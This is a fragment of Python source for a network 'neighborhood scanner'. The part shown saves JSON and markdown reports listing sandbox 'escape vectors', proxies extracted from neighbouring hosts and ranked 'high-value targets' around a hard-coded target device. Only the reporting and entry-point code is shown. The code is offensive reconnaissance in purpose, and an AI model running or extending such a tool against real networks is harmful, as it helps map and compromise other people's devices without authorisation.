                "high_value_targets": len([n for n in self.neighbors.values() if n.score > 0]),
            },
            "escape_vectors": escape_findings,
            "proxies": proxies,
            "high_value_targets": ranked,
            "all_neighbors": {ip: asdict(n) for ip, n in self.neighbors.items()},
            "layer_results": {
                layer: [asdict(r) for r in results]
                for layer, results in self.results.items()
            }
        }
        
        return report

    def _save_results(self, report: Dict[str, Any]):
        """Save scan results to output files."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Full report JSON
        full_path = os.path.join(self.config.output_dir, f"scan_report_{timestamp}.json")
        with open(full_path, "w") as f:
            json.dump(report, f, indent=2, default=str)
        print(f"\n  Saved full report: {full_path}")
        
        # Neighbors JSON
        neighbors_path = os.path.join(self.config.output_dir, f"neighbors_{timestamp}.json")
        with open(neighbors_path, "w") as f:
            json.dump(report["all_neighbors"], f, indent=2, default=str)
        print(f"  Saved neighbors: {neighbors_path}")
        
        # Proxies JSON
        if report["proxies"]:
            proxies_path = os.path.join(self.config.output_dir, f"proxies_{timestamp}.json")
            with open(proxies_path, "w") as f:
                json.dump(report["proxies"], f, indent=2)
            print(f"  Saved proxies: {proxies_path}")
        
        # Markdown report
        md_path = os.path.join(self.config.output_dir, f"SCAN_REPORT_{timestamp}.md")
        with open(md_path, "w") as f:
            f.write(self._generate_markdown_report(report))
        print(f"  Saved markdown: {md_path}")
        
        # Print summary
        print("\n" + "=" * 80)
        print("  SCAN COMPLETE")
        print("=" * 80)
        print(f"  Duration: {report['meta']['duration_seconds']:.1f} seconds")
        print(f"  Experiments: {report['meta']['total_experiments']}")
        print(f"  Neighbors: {report['summary']['neighbors_discovered']}")
        print(f"  Escape Vectors: {report['summary']['escape_vectors_found']}")
        print(f"  Proxies: {report['summary']['proxies_extracted']}")
        print(f"  High-Value Targets: {report['summary']['high_value_targets']}")

    def _generate_markdown_report(self, report: Dict[str, Any]) -> str:
        """Generate a markdown summary report."""
        md = f"""# Unified Neighborhood Scan Report
## Device: {report['meta']['target_device']}
### Generated: {report['meta']['end_time']}

---

## Summary

| Metric | Value |
|--------|-------|
| Duration | {report['meta']['duration_seconds']:.1f}s |
| Total Experiments | {report['meta']['total_experiments']} |
| Neighbors Discovered | {report['summary']['neighbors_discovered']} |
| Escape Vectors Found | {report['summary']['escape_vectors_found']} |
| Proxies Extracted | {report['summary']['proxies_extracted']} |
| High-Value Targets | {report['summary']['high_value_targets']} |

---

## Escape Vectors Confirmed

"""
        for ev in report['escape_vectors']:
            md += f"- **{ev['id']}**: {ev['title']} — {ev['finding']}\n"
        
        md += "\n---\n\n## Proxies Extracted\n\n"
        if report['proxies']:
            md += "| IP | Proxy |\n|-----|-------|\n"
            for p in report['proxies'][:20]:
                md += f"| {p['ip']} | {p['proxy'][:50]} |\n"
        else:
            md += "No proxies extracted.\n"
        
        md += "\n---\n\n## Top 20 High-Value Targets\n\n"
        md += "| Rank | IP | Model | Score | Apps |\n|------|-----|-------|-------|------|\n"
        for i, target in enumerate(report['high_value_targets'][:20], 1):
            apps = len(target.get('apps', []))
            md += f"| {i} | {target['ip']} | {target.get('model', '?')[:20]} | {target.get('score', 0)} | {apps} |\n"
        
        return md


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

async def main():
    """Main entry point for the unified scanner."""
    config = ScannerConfig(
        target_device="ATP6416I3JJRXL3V",
        max_neighbors=600,
        rate_limit_delay=3.0,
    )
    
    scanner = UnifiedNeighborhoodScanner(config)
    report = await scanner.run_full_scan()
    
    return report


if __name__ == "__main__":
    asyncio.run(main())
